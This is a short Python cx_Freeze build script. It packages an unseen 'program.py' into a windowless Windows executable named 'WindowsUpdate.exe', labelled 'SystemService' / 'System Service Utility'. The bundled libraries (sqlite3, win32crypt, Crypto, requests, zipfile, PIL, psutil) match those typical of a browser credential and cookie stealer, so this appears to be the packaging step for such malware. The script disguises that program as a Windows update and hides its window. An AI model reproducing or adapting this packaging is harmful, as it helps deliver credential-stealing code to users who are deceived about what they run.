import sys
from cx_Freeze import setup, Executable

build_exe_options = {
    "packages": [
        "os", "json", "base64", "sqlite3", "requests", "shutil", 
        "zipfile", "tempfile", "psutil", "warnings", "pathlib", 
        "datetime", "Crypto", "win32crypt", "PIL", "importlib"
    ],
    "includes": [
        "importlib.abc", "importlib.metadata", "importlib.resources"
    ],
    "excludes": ["tkinter", "test", "unittest", "email"],
    "include_files": [],
    "optimize": 2
}

base = "Win32GUI"

setup(
    name="SystemService",
    version="1.0",
    description="System Service Utility",
    options={"build_exe": build_exe_options},
    executables=[Executable("program.py", base=base, target_name="WindowsUpdate.exe")]
)